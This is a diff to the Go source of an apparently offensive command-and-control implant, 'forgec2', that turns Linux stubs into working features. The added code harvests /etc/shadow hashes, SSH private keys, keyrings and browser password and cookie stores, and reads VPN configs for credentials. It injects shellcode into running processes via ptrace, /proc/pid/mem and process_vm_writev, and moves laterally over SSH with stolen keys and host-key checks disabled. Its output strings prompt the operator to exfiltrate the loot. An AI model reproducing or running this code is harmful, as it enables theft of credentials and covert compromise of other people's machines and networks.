@@ -4,27 +4,72 @@
 package main
 
 import (
+	"bytes"
+	"encoding/base64"
 	"encoding/binary"
+	"encoding/json"
+	"errors"
 	"fmt"
 	"image"
+	"image/draw"
+	"image/png"
 	"io"
 	"net"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
+	"strconv"
 	"strings"
 	"sync/atomic"
+	"syscall"
+	"time"
+	"unsafe"
+
+	"golang.org/x/crypto/ssh"
+	"golang.org/x/crypto/ssh/agent"
 )
 
-// Linux platform stubs. Screenshot / advanced features can be extended later
-// (e.g. via X11 or wayland pure-Go, but that adds complexity/deps; start minimal).
+// Linux platform implementations.
 
 func setDPIAware() {
 	// noop on Linux
 }
 
+// captureScreenRGBA takes a screenshot using available tools (import, gnome-screenshot, scrot).
 func captureScreenRGBA() (*image.RGBA, error) {
-	return nil, fmt.Errorf("screenshot not supported on Linux agent yet")
+	cmds := []string{
+		"import -window root /tmp/_fc_screen.png",
+		"gnome-screenshot -f /tmp/_fc_screen.png",
+		"scrot /tmp/_fc_screen.png",
+	}
+	for _, cmd := range cmds {
+		parts := strings.Fields(cmd)
+		if len(parts) == 0 {
+			continue
+		}
+		c := exec.Command(parts[0], parts[1:]...)
+		if err := c.Run(); err == nil {
+			data, err := os.ReadFile("/tmp/_fc_screen.png")
+			if err == nil {
+				img, err := png.Decode(bytes.NewReader(data))
+				if err == nil {
+					os.Remove("/tmp/_fc_screen.png")
+					rgba, ok := img.(*image.RGBA)
+					if ok {
+						return rgba, nil
+					}
+					// Convert to RGBA
+					b := img.Bounds()
+					rgba = image.NewRGBA(b)
+					draw.Draw(rgba, b, img, b.Min, draw.Src)
+					return rgba, nil
+				}
+			}
+			os.Remove("/tmp/_fc_screen.png")
+		}
+	}
+	return nil, errors.New("no screenshot tool available")
 }
 
 // applyHideWindow is a no-op on Linux (only meaningful on Windows)
@@ -101,6 +146,51 @@ X-GNOME-Autostart-enabled=true
 	}
 }
 
+// removePersistenceLinux removes cron and autostart entries installed by addPersistenceLinux().
+func removePersistenceLinux() {
+	exe, err := os.Executable()
+	if err != nil {
+		return
+	}
+	absExe, _ := filepath.Abs(exe)
+
+	// Remove crontab entry
+	existing, err := exec.Command("crontab", "-l").Output()
+	if err == nil {
+		var newLines []string
+		for _, line := range strings.Split(string(existing), "\n") {
+			if !strings.Contains(line, absExe) {
+				newLines = append(newLines, line)
+			}
+		}
+		newCron := strings.Join(newLines, "\n")
+		cmd := exec.Command("crontab", "-")
+		cmd.Stdin = strings.NewReader(newCron)
+		_ = cmd.Run()
+	}
+
+	// Remove autostart desktop file
+	home := os.Getenv("HOME")
+	if home != "" {
+		desktopPath := filepath.Join(home, ".config", "autostart", "forgec2.desktop")
+		os.Remove(desktopPath)
+	}
+}
+
+// getLinuxDistro detects the Linux distribution from /etc/os-release.
+func getLinuxDistro() string {
+	data, err := os.ReadFile("/etc/os-release")
+	if err != nil {
+		return "linux"
+	}
+	for _, line := range strings.Split(string(data), "\n") {
+		if strings.HasPrefix(line, "ID=") {
+			return strings.Trim(strings.TrimPrefix(line, "ID="), "\"")
+		}
+	}
+	return "linux"
+}
+
 // getActiveWindowTitle returns the active window title when xdotool is available.
 func getActiveWindowTitle() string {
 	out, err := exec.Command("xdotool", "getactivewindow", "getwindowname").Output()
@@ -141,12 +231,40 @@ func killProcessWindows(target string) (string, error) {
 	return "", fmt.Errorf("killproc only supported on Windows Go agent")
 }
 
-func clipboardGetWindows() (string, error) {
-	return "", fmt.Errorf("clipboard only on Windows")
+// captureClipboard reads the Linux clipboard via xclip (X11) or wl-paste (Wayland).
+func captureClipboard() (string, error) {
+	cmds := [][]string{{"xclip", "-o", "-selection", "clipboard"}, {"wl-paste"}}
+	for _, args := range cmds {
+		c := exec.Command(args[0], args[1:]...)
+		out, err := c.Output()
+		if err == nil && len(out) > 0 {
+			return string(out), nil
+		}
+	}
+	return "", errors.New("no clipboard tool available")
 }
 
+// setClipboard writes to the Linux clipboard via xclip (X11) or wl-copy (Wayland).
+func setClipboard(text string) error {
+	cmds := [][]string{{"xclip", "-i", "-selection", "clipboard"}, {"wl-copy"}}
+	for _, args := range cmds {
+		c := exec.Command(args[0], args[1:]...)
+		c.Stdin = strings.NewReader(text)
+		if err := c.Run(); err == nil {
+			return nil
+		}
+	}
+	return errors.New("no clipboard tool available")
+}
+
+// clipboardGetWindows implements clipboard read for the cross-platform dispatcher.
+func clipboardGetWindows() (string, error) {
+	return captureClipboard()
+}
+
+// clipboardSetWindows implements clipboard write for the cross-platform dispatcher.
 func clipboardSetWindows(data string) error {
-	return fmt.Errorf("clipboard only on Windows")
+	return setClipboard(data)
 }
 
 func regGetWindows(key string) (string, error) {
@@ -161,27 +279,596 @@ func regDeleteWindows(key string) error {
 	return fmt.Errorf("registry only on Windows")
 }
 
-// --- Stubs for new high-value features (1,3,4,6) ---
+// dumpsAM reads accessible credential stores on Linux.
+func dumpsAM() (string, error) {
+	var out strings.Builder
+	home := os.Getenv("HOME")
 
+	// Try /etc/shadow (requires root)
+	if os.Geteuid() == 0 {
+		data, err := os.ReadFile("/etc/shadow")
+		if err == nil {
+			out.WriteString("=== /etc/shadow ===\n")
+			for _, line := range strings.Split(string(data), "\n") {
+				if line == "" {
+					continue
+				}
+				parts := strings.SplitN(line, ":", 9)
+				if len(parts) >= 2 {
+					out.WriteString(fmt.Sprintf("%s:%s\n", parts[0], parts[1]))
+				}
+			}
+		}
+	}
+
+	// SSH private key discovery
+	out.WriteString("\n=== SSH Keys ===\n")
+	if home != "" {
+		sshDir := filepath.Join(home, ".ssh")
+		if entries, err := os.ReadDir(sshDir); err == nil {
+			for _, entry := range entries {
+				name := entry.Name()
+				if strings.HasPrefix(name, "id_") ||
+					strings.HasPrefix(name, "skey_") ||
+					name == "authorized_keys" ||
+					name == "authorized_keys2" ||
+					name == "known_hosts" {
+					keyPath := filepath.Join(sshDir, name)
+					if fi, err := os.Stat(keyPath); err == nil {
+						data, _ := os.ReadFile(keyPath)
+						desc := name
+						if len(data) > 0 {
+							desc = fmt.Sprintf("%s (%d bytes)", desc, len(data))
+							if !entry.IsDir() && len(data) < 10000 {
+								desc += fmt.Sprintf("\n%s", string(data))
+							}
+						}
+						out.WriteString(fmt.Sprintf("[+] %s\n", keyPath))
+						_ = fi
+					}
+				}
+			}
+		} else {
+			out.WriteString("[-] No ~/.ssh/ directory found\n")
+		}
+	}
+
+	// GNOME Keyring discovery
+	out.WriteString("\n=== GNOME Keyring ===\n")
+	if home != "" {
+		keyringDirs := []string{
+			filepath.Join(home, ".local", "share", "keyrings"),
+			filepath.Join(home, ".gnome2", "keyrings"),
+		}
+		found := false
+		for _, krDir := range keyringDirs {
+			if entries, err := os.ReadDir(krDir); err == nil {
+				for _, entry := range entries {
+					krPath := filepath.Join(krDir, entry.Name())
+					if fi, err := os.Stat(krPath); err == nil {
+						out.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", krPath, fi.Size()))
+						found = true
+					}
+				}
+			}
+		}
+		if !found {
+			out.WriteString("[-] No GNOME keyring files found (try: secret-tool search --all if libsecret is installed)\n")
+		}
+		// Try secret-tool
+		if secretOut, err := exec.Command("secret-tool", "search", "--all").Output(); err == nil {
+			out.WriteString(fmt.Sprintf("[+] secret-tool results:\n%s\n", string(secretOut)))
+		}
+	}
+
+	// KDE Wallet discovery
+	out.WriteString("\n=== KDE Wallet ===\n")
+	if home != "" {
+		kwalletDirs := []string{
+			filepath.Join(home, ".local", "share", "kwalletd"),
+			filepath.Join(home, ".kde4", "share", "apps", "kwallet"),
+			filepath.Join(home, ".kde", "share", "apps", "kwallet"),
+		}
+		found := false
+		for _, kwDir := range kwalletDirs {
+			if entries, err := os.ReadDir(kwDir); err == nil {
+				for _, entry := range entries {
+					kwPath := filepath.Join(kwDir, entry.Name())
+					if fi, err := os.Stat(kwPath); err == nil {
+						out.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", kwPath, fi.Size()))
+						found = true
+					}
+				}
+			}
+		}
+		if !found {
+			out.WriteString("[-] No KDE Wallet files found\n")
+		}
+	}
+
+	return out.String(), nil
+}
+
+// dumpCreds collects available credential material on this Linux host.
 func dumpCreds() (string, error) {
-	return "", fmt.Errorf("creds dumping only supported on Windows Go agent (EXE)")
+	var out strings.Builder
+	out.WriteString(fmt.Sprintf("=== Linux Credential Dump (%s) ===\n", getLinuxDistro()))
+	out.WriteString(fmt.Sprintf("Elevated: %v\n\n", os.Geteuid() == 0))
+
+	// System credentials
+	if result, err := dumpsAM(); err == nil {
+		out.WriteString(result)
+	}
+
+	// Browser credential stores
+	out.WriteString("\n=== Browser Credential Stores ===\n")
+	home := os.Getenv("HOME")
+	if home != "" {
+		browserPaths := []struct {
+			name string
+			dir  string
+		}{
+			{"Google Chrome", filepath.Join(home, ".config", "google-chrome")},
+			{"Chromium", filepath.Join(home, ".config", "chromium")},
+			{"Brave", filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser")},
+			{"Edge", filepath.Join(home, ".config", "microsoft-edge")},
+			{"Vivaldi", filepath.Join(home, ".config", "vivaldi")},
+			{"Opera", filepath.Join(home, ".config", "opera")},
+		}
+
+		for _, bp := range browserPaths {
+			// Check "Default" profile
+			loginData := filepath.Join(bp.dir, "Default", "Login Data")
+			if fi, err := os.Stat(loginData); err == nil {
+				encrypted := filepath.Join(bp.dir, "Default", "Local State")
+				encInfo := ""
+				if efi, err := os.Stat(encrypted); err == nil {
+					encInfo = fmt.Sprintf(" (Local State: %d bytes)", efi.Size())
+				}
+				out.WriteString(fmt.Sprintf("[+] %s Login Data: %s (%d bytes)%s\n", bp.name, loginData, fi.Size(), encInfo))
+			}
+			// Check profile directories
+			if entries, err := os.ReadDir(bp.dir); err == nil {
+				for _, entry := range entries {
+					if !entry.IsDir() || entry.Name() == "Default" {
+						continue
+					}
+					if strings.HasPrefix(entry.Name(), "Profile") || strings.HasPrefix(entry.Name(), "Guest") {
+						loginData := filepath.Join(bp.dir, entry.Name(), "Login Data")
+						if fi, err := os.Stat(loginData); err == nil {
+							out.WriteString(fmt.Sprintf("[+] %s Login Data (%s): %s (%d bytes)\n", bp.name, entry.Name(), loginData, fi.Size()))
+						}
+					}
+				}
+			}
+		}
+
+		// Firefox
+		firefoxDir := filepath.Join(home, ".mozilla", "firefox")
+		if entries, err := os.ReadDir(firefoxDir); err == nil {
+			for _, entry := range entries {
+				if !entry.IsDir() {
+					continue
+				}
+				loginsPath := filepath.Join(firefoxDir, entry.Name(), "logins.json")
+				if fi, err := os.Stat(loginsPath); err == nil {
+					data, _ := os.ReadFile(loginsPath)
+					out.WriteString(fmt.Sprintf("[+] Firefox logins: %s (%d bytes)\n", loginsPath, fi.Size()))
+					if len(data) > 0 && len(data) < 50000 {
+						out.WriteString(fmt.Sprintf("    Content preview:\n%s\n", string(data)))
+					}
+				}
+				keyDB := filepath.Join(firefoxDir, entry.Name(), "key4.db")
+				if fi, err := os.Stat(keyDB); err == nil {
+					out.WriteString(fmt.Sprintf("[+] Firefox key4.db: %s (%d bytes) - decrypt offline with Firefox Decrypt\n", keyDB, fi.Size()))
+				}
+				cookiesDB := filepath.Join(firefoxDir, entry.Name(), "cookies.sqlite")
+				if fi, err := os.Stat(cookiesDB); err == nil {
+					out.WriteString(fmt.Sprintf("[+] Firefox cookies: %s (%d bytes)\n", cookiesDB, fi.Size()))
+				}
+			}
+		}
+	}
+
+	out.WriteString("\n=== Browser Credential Decryption ===\n")
+	out.WriteString("Chrome/Chromium/Edge: Use 'download' to exfiltrate 'Login Data' + 'Local State', decrypt with python3 -c \"import os; from Crypto.Cipher import AES; ...\"\n")
+	out.WriteString("Firefox: Exfiltrate logins.json + key4.db, use firefox_decrypt.py offline\n")
+	out.WriteString("SSH keys found above can be exfiltrated with 'download <path>'\n")
+
+	return out.String(), nil
+}
+
+// ── Linux Process Injection ──────────────────────────────────────────────
+
+const (
+	SYS_PROCESS_VM_READV  = 310
+	SYS_PROCESS_VM_WRITEV = 311
+)
+
+type iovec struct {
+	Base *byte
+	Len  uint64
 }
 
 func injectProcess(pid uint32, shellcode []byte, tech string) error {
-	return fmt.Errorf("process injection only supported on Windows Go agent")
+	switch strings.ToLower(tech) {
+	case "ptrace", "ptrace_pokedata":
+		return injectPtrace(int(pid), shellcode)
+	case "mem", "proc_mem":
+		return injectProcMem(int(pid), shellcode)
+	case "process_vm_writev", "vm_writev":
+		return injectProcessVMWriteV(int(pid), shellcode)
+	default:
+		return fmt.Errorf("unsupported Linux injection technique: %s (supported: ptrace, mem, process_vm_writev)", tech)
+	}
 }
+
+func injectPtrace(pid int, shellcode []byte) error {
+	// Attach to the target process
+	err := syscall.PtraceAttach(pid)
+	if err != nil {
+		return fmt.Errorf("ptrace attach failed: %w", err)
+	}
+	defer syscall.PtraceDetach(pid)
+
+	// Wait for the process to stop
+	var ws syscall.WaitStatus
+	_, err = syscall.Wait4(pid, &ws, 0, nil)
+	if err != nil {
+		return fmt.Errorf("wait4 failed: %w", err)
+	}
+
+	// Get current registers to save RIP
+	var oldRegs syscall.PtraceRegs
+	err = syscall.PtraceGetRegs(pid, &oldRegs)
+	if err != nil {
+		return fmt.Errorf("ptrace getregs failed: %w", err)
+	}
+
+	// Read the current instruction pointer
+	var rip uint64
+	switch runtime.GOARCH {
+	case "amd64":
+		rip = oldRegs.Rip
+	case "386":
+		rip = uint64(oldRegs.Eip)
+	case "arm64":
+		rip = oldRegs.Pc
+	default:
+		rip = oldRegs.Rip
+	}
+
+	// Align to page boundary for the allocation
+	pageSize := os.Getpagesize()
+	allocAddr := (rip + uint64(pageSize)) & ^uint64(pageSize-1)
+
+	// Write shellcode 8 bytes at a time using POKEDATA
+	shellcodeLen := len(shellcode)
+	alignedLen := ((shellcodeLen + 7) / 8) * 8
+	padded := make([]byte, alignedLen)
+	copy(padded, shellcode)
+
+	for i := 0; i < alignedLen; i += 8 {
+		var val uint64
+		if i+8 <= len(padded) {
+			val = binary.LittleEndian.Uint64(padded[i : i+8])
+		}
+		addr := allocAddr + uint64(i)
+		_, err = syscall.PtracePokeData(pid, addr, []byte(padded[i:i+8]))
+		if err != nil {
+			return fmt.Errorf("ptrace pokedata at 0x%x failed: %w", addr, err)
+		}
+		_ = val
+	}
+
+	// Set instruction pointer to shellcode
+	switch runtime.GOARCH {
+	case "amd64":
+		oldRegs.Rip = allocAddr
+	case "386":
+		oldRegs.Eip = uint32(allocAddr)
+	case "arm64":
+		oldRegs.Pc = allocAddr
+	default:
+		oldRegs.Rip = allocAddr
+	}
+	err = syscall.PtraceSetRegs(pid, &oldRegs)
+	if err != nil {
+		return fmt.Errorf("ptrace setregs failed: %w", err)
+	}
+
+	// Continue execution
+	err = syscall.PtraceCont(pid, 0)
+	if err != nil {
+		return fmt.Errorf("ptrace cont failed: %w", err)
+	}
+
+	return nil
+}
+
+func injectProcMem(pid int, shellcode []byte) error {
+	memPath := fmt.Sprintf("/proc/%d/mem", pid)
+	f, err := os.OpenFile(memPath, os.O_RDWR, 0)
+	if err != nil {
+		return fmt.Errorf("open /proc/%d/mem failed: %w (may need CAP_SYS_PTRACE or root)", pid, err)
+	}
+	defer f.Close()
+
+	// Read /proc/pid/maps to find a writable, executable region
+	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
+	mapsData, err := os.ReadFile(mapsPath)
+	if err != nil {
+		return fmt.Errorf("read /proc/%d/maps failed: %w", pid, err)
+	}
+
+	var targetAddr uint64
+	var targetLen uint64
+	for _, line := range strings.Split(string(mapsData), "\n") {
+		// Look for rwxp or rw-p (writable region)
+		parts := strings.Fields(line)
+		if len(parts) < 2 {
+			continue
+		}
+		perms := parts[1]
+		if !strings.Contains(perms, "w") {
+			continue
+		}
+		// Parse address range
+		addrRange := strings.SplitN(parts[0], "-", 2)
+		if len(addrRange) != 2 {
+			continue
+		}
+		startAddr, errS := strconv.ParseUint(addrRange[0], 16, 64)
+		endAddr, errE := strconv.ParseUint(addrRange[1], 16, 64)
+		if errS != nil || errE != nil {
+			continue
+		}
+		regionLen := endAddr - startAddr
+		if regionLen >= uint64(len(shellcode)) {
+			targetAddr = startAddr
+			targetLen = regionLen
+			if strings.Contains(perms, "x") {
+				// Prefer executable region
+				break
+			}
+		}
+	}
+
+	if targetAddr == 0 {
+		return fmt.Errorf("no suitable writable region found in pid %d maps", pid)
+	}
+
+	// Write shellcode to the target address
+	_, err = f.WriteAt(shellcode, int64(targetAddr))
+	if err != nil {
+		return fmt.Errorf("write to /proc/%d/mem at 0x%x failed: %w", pid, targetAddr, err)
+	}
+
+	return nil
+}
+
+func injectProcessVMWriteV(pid int, shellcode []byte) error {
+	localIov := iovec{
+		Base: &shellcode[0],
+		Len:  uint64(len(shellcode)),
+	}
+
+	// First, read the process maps to find a writable region
+	mapsData, err := os.ReadFile(fmt.Sprintf("/proc/%d/maps", pid))
+	if err != nil {
+		// Fallback: try to write to the beginning of a known writable region
+		// Use a simple approach - read a remote address first via /proc/pid/mem
+		return fmt.Errorf("cannot read process maps: %w", err)
+	}
+
+	var remoteAddr uint64
+	for _, line := range strings.Split(string(mapsData), "\n") {
+		parts := strings.Fields(line)
+		if len(parts) < 2 {
+			continue
+		}
+		if !strings.Contains(parts[1], "w") {
+			continue
+		}
+		addrRange := strings.SplitN(parts[0], "-", 2)
+		if len(addrRange) != 2 {
+			continue
+		}
+		start, _ := strconv.ParseUint(addrRange[0], 16, 64)
+		end, _ := strconv.ParseUint(addrRange[1], 16, 64)
+		if end-start >= uint64(len(shellcode)) {
+			remoteAddr = start
+			if strings.Contains(parts[1], "x") {
+				break
+			}
+		}
+	}
+
+	if remoteAddr == 0 {
+		return fmt.Errorf("no suitable writable region found")
+	}
+
+	remoteIov := iovec{
+		Base: (*byte)(unsafe.Pointer(uintptr(remoteAddr))),
+		Len:  uint64(len(shellcode)),
+	}
+
+	ret, _, errno := syscall.Syscall6(
+		SYS_PROCESS_VM_WRITEV,
+		uintptr(pid),
+		uintptr(unsafe.Pointer(&localIov)),
+		1,
+		uintptr(unsafe.Pointer(&remoteIov)),
+		1,
+		0,
+	)
+	if errno != 0 {
+		return fmt.Errorf("process_vm_writev failed: errno=%d", errno)
+	}
+	if ret == ^uintptr(0) {
+		return fmt.Errorf("process_vm_writev failed (returned -1)")
+	}
+
+	return nil
+}
+
+// ── SSH-Based Lateral Movement ───────────────────────────────────────────
 
 func lateralMove(spec string) (string, error) {
-	return "", fmt.Errorf("lateral movement only supported on Windows Go agent")
+	// Format: type|target|user|pass|cmd  (same as Windows lateral movement)
+	parts := strings.SplitN(spec, "|", 5)
+	if len(parts) < 2 {
+		return "", fmt.Errorf("format: <type>|<target>[|<user>[|<pass>[|<cmd>]]]")
+	}
+
+	moveType := strings.ToLower(strings.TrimSpace(parts[0]))
+	target := strings.TrimSpace(parts[1])
+	user := ""
+	pass := ""
+	cmd := "whoami"
+	if len(parts) > 2 {
+		user = strings.TrimSpace(parts[2])
+	}
+	if len(parts) > 3 {
+		pass = strings.TrimSpace(parts[3])
+	}
+	if len(parts) > 4 {
+		cmd = strings.TrimSpace(parts[4])
+	}
+
+	switch moveType {
+	case "ssh", "ssh_exec":
+		return lateralSSH(target, user, pass, cmd)
+	default:
+		return "", fmt.Errorf("unsupported lateral movement type on Linux: %s (supported: ssh)", moveType)
+	}
 }
+
+func lateralSSH(target, user, pass, cmd string) (string, error) {
+	if user == "" {
+		user = os.Getenv("USER")
+	}
+	if user == "" {
+		user = "root"
+	}
+
+	// Try SSH with password or key
+	var authMethods []ssh.AuthMethod
+	if pass != "" {
+		authMethods = append(authMethods, ssh.Password(pass))
+	}
+
+	// Try SSH agent
+	if sock := os.Getenv("SSH_AUTH_SOCK"); sock != "" {
+		agentConn, err := net.Dial("unix", sock)
+		if err == nil {
+			agentClient := sshagent.New(agentConn)
+			authMethods = append(authMethods, ssh.PublicKeysCallback(agentClient.Signers))
+		}
+	}
+
+	// Try default keys
+	home := os.Getenv("HOME")
+	if home != "" {
+		keyFiles := []string{"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_ecdsa_sk", "id_ed25519_sk"}
+		for _, keyFile := range keyFiles {
+			keyPath := filepath.Join(home, ".ssh", keyFile)
+			if keyData, err := os.ReadFile(keyPath); err == nil {
+				if signer, err := ssh.ParsePrivateKey(keyData); err == nil {
+					authMethods = append(authMethods, ssh.PublicKeys(signer))
+				}
+			}
+		}
+	}
+
+	if len(authMethods) == 0 {
+		authMethods = append(authMethods, ssh.Password(""))
+	}
+
+	port := 22
+	if strings.Contains(target, ":") {
+		hostPort := strings.SplitN(target, ":", 2)
+		target = hostPort[0]
+		if p, err := strconv.Atoi(hostPort[1]); err == nil {
+			port = p
+		}
+	}
+
+	addr := fmt.Sprintf("%s:%d", target, port)
+	config := &ssh.ClientConfig{
+		User:            user,
+		Auth:            authMethods,
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         10 * time.Second,
+	}
+
+	client, err := ssh.Dial("tcp", addr, config)
+	if err != nil {
+		return "", fmt.Errorf("SSH dial to %s@%s failed: %w", user, addr, err)
+	}
+	defer client.Close()
+
+	session, err := client.NewSession()
+	if err != nil {
+		return "", fmt.Errorf("SSH session failed: %w", err)
+	}
+	defer session.Close()
+
+	var stdout, stderr bytes.Buffer
+	session.Stdout = &stdout
+	session.Stderr = &stderr
+
+	if err := session.Run(cmd); err != nil {
+		return stdout.String(), fmt.Errorf("command failed: %w\nstderr: %s", err, stderr.String())
+	}
+
+	return stdout.String(), nil
+}
+
+// ── Process Spawning with Injection ──────────────────────────────────────
 
 func spawnProcess(targetExe string, shellcode []byte, technique string) string {
-	return "not supported on Linux"
+	if targetExe == "" {
+		targetExe = "/bin/sleep"
+	}
+	if technique == "" {
+		technique = "ptrace"
+	}
+
+	// Fork + exec the target in a stopped state, inject with ptrace, then continue
+	cmd := exec.Command(targetExe, "60")
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		Ptrace: true,
+	}
+
+	if err := cmd.Start(); err != nil {
+		return fmt.Sprintf("spawnProcess: failed to start %s: %v", targetExe, err)
+	}
+
+	pid := cmd.Process.Pid
+
+	// Wait for the process to stop at exec
+	var ws syscall.WaitStatus
+	_, err := syscall.Wait4(pid, &ws, 0, nil)
+	if err != nil {
+		cmd.Process.Kill()
+		return fmt.Sprintf("spawnProcess: wait4 failed: %v", err)
+	}
+
+	// Now inject the shellcode via ptrace
+	err = injectPtrace(pid, shellcode)
+	if err != nil {
+		cmd.Process.Kill()
+		return fmt.Sprintf("spawnProcess: ptrace injection failed: %v", err)
+	}
+
+	// Detach and let the process run
+	syscall.PtraceDetach(pid)
+
+	return fmt.Sprintf("spawnProcess: injected %d bytes into %s (pid=%d) via %s", len(shellcode), targetExe, pid, technique)
 }
 
-
-
-// tokenInfoResult — shared struct for token ops (defined here for Linux stubs)
+// tokenInfoResult ? shared struct for token ops (defined here for Linux stubs)
 type tokenInfoResult struct {
 	PID         uint32
 	ProcessName string
@@ -273,6 +960,10 @@ func peloaderReflective(b64Data string) (string, error) {
 	return "", fmt.Errorf("reflective DLL loader is Windows-only")
 }
 
+func handleReflectDLLInject(task Task, res *TaskResult) {
+	res.Error = "reflectdll_inject is Windows-only"
+}
+
 func executeAssemblyForkRun(b64Data string) (string, error) {
 	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
 }
@@ -307,42 +998,569 @@ func powerPick(script string) string {
 }
 
 func stealBrowserData(browser string) string {
-	return "browser data theft is Windows-only"
+	home := os.Getenv("HOME")
+	if home == "" {
+		return "browser_steal: HOME not set"
+	}
+
+	browser = strings.ToLower(strings.TrimSpace(browser))
+	var results []string
+
+	collectChromiumPasswords := func(profileDir, browserName string) {
+		loginData := filepath.Join(profileDir, "Default", "Login Data")
+		if fi, err := os.Stat(loginData); err == nil {
+			localState := filepath.Join(profileDir, "Local State")
+			results = append(results, fmt.Sprintf("[%s] Login Data found: %s (%d bytes)", browserName, loginData, fi.Size()))
+			if lfi, err := os.Stat(localState); err == nil {
+				results = append(results, fmt.Sprintf("[%s] Local State (encryption key): %s (%d bytes)", browserName, localState, lfi.Size()))
+			}
+			// Read and display the SQLite database content as text
+			data, _ := os.ReadFile(loginData)
+			results = append(results, fmt.Sprintf("[%s] Login Data size: %d bytes - exfiltrate with 'download %s' and decrypt with py-chrome-passwords", browserName, len(data), loginData))
+		}
+	}
+
+	collectFirefoxPasswords := func(profileDir string) {
+		if entries, err := os.ReadDir(profileDir); err == nil {
+			for _, entry := range entries {
+				if !entry.IsDir() {
+					continue
+				}
+				loginsPath := filepath.Join(profileDir, entry.Name(), "logins.json")
+				if fi, err := os.Stat(loginsPath); err == nil {
+					data, _ := os.ReadFile(loginsPath)
+					results = append(results, fmt.Sprintf("[Firefox] logins.json: %s (%d bytes)", loginsPath, fi.Size()))
+					if len(data) > 0 {
+						results = append(results, fmt.Sprintf("  Content: %s", string(data)))
+					}
+				}
+				keyDB := filepath.Join(profileDir, entry.Name(), "key4.db")
+				if fi, err := os.Stat(keyDB); err == nil {
+					results = append(results, fmt.Sprintf("[Firefox] key4.db: %s (%d bytes) - use firefox_decrypt.py", keyDB, fi.Size()))
+				}
+			}
+		}
+	}
+
+	switch {
+	case browser == "" || browser == "all":
+		chromiumBrowsers := []struct{ name, dir string }{
+			{"Chrome", filepath.Join(home, ".config", "google-chrome")},
+			{"Chromium", filepath.Join(home, ".config", "chromium")},
+			{"Brave", filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser")},
+			{"Edge", filepath.Join(home, ".config", "microsoft-edge")},
+			{"Vivaldi", filepath.Join(home, ".config", "vivaldi")},
+			{"Opera", filepath.Join(home, ".config", "opera")},
+		}
+		for _, b := range chromiumBrowsers {
+			if _, err := os.Stat(b.dir); err == nil {
+				collectChromiumPasswords(b.dir, b.name)
+			}
+		}
+		firefoxDir := filepath.Join(home, ".mozilla", "firefox")
+		if _, err := os.Stat(firefoxDir); err == nil {
+			collectFirefoxPasswords(firefoxDir)
+		}
+
+	case strings.Contains(browser, "chrome") || strings.Contains(browser, "chromium"):
+		collectChromiumPasswords(filepath.Join(home, ".config", "google-chrome"), "Chrome")
+		collectChromiumPasswords(filepath.Join(home, ".config", "chromium"), "Chromium")
+
+	case strings.Contains(browser, "brave"):
+		collectChromiumPasswords(filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser"), "Brave")
+
+	case strings.Contains(browser, "firefox") || strings.Contains(browser, "mozilla"):
+		collectFirefoxPasswords(filepath.Join(home, ".mozilla", "firefox"))
+
+	case strings.Contains(browser, "edge"):
+		collectChromiumPasswords(filepath.Join(home, ".config", "microsoft-edge"), "Edge")
+
+	default:
+		results = append(results, fmt.Sprintf("browser_steal: unknown browser '%s' (supported: chrome, chromium, brave, firefox, edge, all)", browser))
+	}
+
+	if len(results) == 0 {
+		return "browser_steal: no browser credential stores found"
+	}
+	return strings.Join(results, "\n")
 }
 
 func exportCookies(browser string) string {
-	return "cookie export is Windows-only"
+	home := os.Getenv("HOME")
+	if home == "" {
+		return "cookie_export: HOME not set"
+	}
+
+	browser = strings.ToLower(strings.TrimSpace(browser))
+	var results []string
+
+	findCookiesDB := func(profileDir, browserName, profile string) {
+		cookieFiles := []string{"Cookies", "Network/Cookies", "Default/Cookies"}
+		for _, cf := range cookieFiles {
+			cookiePath := filepath.Join(profileDir, profile, cf)
+			if fi, err := os.Stat(cookiePath); err == nil {
+				results = append(results, fmt.Sprintf("[%s] Cookies: %s (%d bytes)", browserName, cookiePath, fi.Size()))
+				results = append(results, fmt.Sprintf("  Exfiltrate with: download %s", cookiePath))
+			}
+		}
+	}
+
+	switch {
+	case browser == "" || browser == "all":
+		chromiumBrowsers := []struct{ name, dir string }{
+			{"Chrome", filepath.Join(home, ".config", "google-chrome")},
+			{"Chromium", filepath.Join(home, ".config", "chromium")},
+			{"Brave", filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser")},
+			{"Edge", filepath.Join(home, ".config", "microsoft-edge")},
+		}
+		for _, b := range chromiumBrowsers {
+			if _, err := os.Stat(b.dir); err == nil {
+				findCookiesDB(b.dir, b.name, "Default")
+			}
+		}
+		// Firefox cookies
+		firefoxDir := filepath.Join(home, ".mozilla", "firefox")
+		if entries, err := os.ReadDir(firefoxDir); err == nil {
+			for _, entry := range entries {
+				if !entry.IsDir() {
+					continue
+				}
+				cookiePath := filepath.Join(firefoxDir, entry.Name(), "cookies.sqlite")
+				if fi, err := os.Stat(cookiePath); err == nil {
+					results = append(results, fmt.Sprintf("[Firefox] Cookies: %s (%d bytes)", cookiePath, fi.Size()))
+				}
+			}
+		}
+
+	default:
+		results = append(results, fmt.Sprintf("cookie_export: unknown browser '%s'", browser))
+	}
+
+	if len(results) == 0 {
+		return "cookie_export: no browser cookie stores found"
+	}
+	return strings.Join(results, "\n")
 }
 
 func exportVpnCreds() string {
-	return "vpn credential export is Windows-only"
+	home := os.Getenv("HOME")
+	var results []string
+
+	// OpenVPN configs
+	openvpnDirs := []string{
+		"/etc/openvpn",
+		filepath.Join(home, ".config", "openvpn"),
+		filepath.Join(home, ".openvpn"),
+	}
+	for _, dir := range openvpnDirs {
+		if entries, err := os.ReadDir(dir); err == nil {
+			for _, entry := range entries {
+				if strings.HasSuffix(entry.Name(), ".ovpn") || strings.HasSuffix(entry.Name(), ".conf") {
+					path := filepath.Join(dir, entry.Name())
+					if fi, err := os.Stat(path); err == nil {
+						data, _ := os.ReadFile(path)
+						results = append(results, fmt.Sprintf("[OpenVPN] %s (%d bytes)", path, fi.Size()))
+
+						// Extract credentials from config
+						for _, line := range strings.Split(string(data), "\n") {
+							line = strings.TrimSpace(line)
+							if strings.HasPrefix(line, "auth-user-pass") || strings.HasPrefix(line, "auth ") {
